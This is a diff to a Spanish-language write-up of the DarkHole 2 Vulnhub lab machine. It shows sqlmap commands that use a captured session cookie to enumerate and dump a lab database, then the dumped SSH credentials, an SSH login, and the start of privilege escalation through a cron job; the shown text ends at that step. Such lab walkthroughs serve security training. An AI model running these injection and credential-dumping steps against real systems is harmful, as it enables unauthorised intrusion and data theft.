@@ -91,8 +91,47 @@ Entonces, usamos burpsuite para recopilar las cookies de esta página. Será ven
 Insertamos la cookie capturada anteriormente en sqlmap 
 
 ![image](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/assets/129236342/a1530d38-1748-4d26-be2e-8bea8c6bd538)
+![image](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/assets/129236342/6f481be5-6ea5-4d6d-a0b4-cc0253ba88c4)
+~~~
+sqlmap -u "http://192.168.40.133/dashboard.php?id=1" --cookie="PHPSESSID=674p5g2tk29ieclq6iqdtc2mu4" --dbs –batch
+~~~
+
+Obtuvimos algunas bases de datos en cuestión de minutos. Entonces, iniciamos otro comando (usando el parámetro -D) para volcar la base de datos llamada darkhole_2
+
+![image](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/assets/129236342/3cd9ae27-b481-4022-a0bf-34499d6aa230)
+
+![image](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/assets/129236342/3480ebbb-a385-4252-b9d4-659b051f6225)
 
 ~~~
-sqlmap -u "http://192.168.40.133/dashboard.php?id=1" --cookie="coiafrua9mc461a8436it7eiu4" --dbs –batch
-sqlmap -u "http://192.168.40.133/dashboard.php?id=1" --cookie="coiafrua9mc461a8436it7eiu4" -D darkhole_2 --dump-all --batch
+sqlmap -u "http://192.168.40.133/dashboard.php?id=1" --cookie="PHPSESSID=674p5g2tk29ieclq6iqdtc2mu4" -D darkhole_2 --dump-all --batch
 ~~~
+
+En cuestión de momentos, descubrimos las credenciales ssh para el usuario Jehad en esta base de datos de volcado. 
+
+~~~
+User: jehad
+Pass: fool
+~~~
+
+Ahora, usando estas credenciales ssh, iniciamos sesión con el usuario Jehad y abrimos su identificación para autenticarlo.
+
+![image](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/assets/129236342/cf4abf46-fdfd-475e-95b5-290e7efff130)
+
+~~~
+ssh jehad@192.168.40.133
+id
+~~~
+
+## Escala de privilegios
+
+Vemos un cron  que se ejecuta con el usuario losy.
+
+Aquí podemos ver que un servidor web se está ejecutando en el puerto 9999. Cuando vemos el contenido del código fuente, vemos que esto permite la ejecución remota de comandos.
+
+![image](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/assets/129236342/dc94e9dc-3ae6-4bb0-8952-f6756a3bdcb7)
+
+    cat /etc/crontab
+
+
+
+
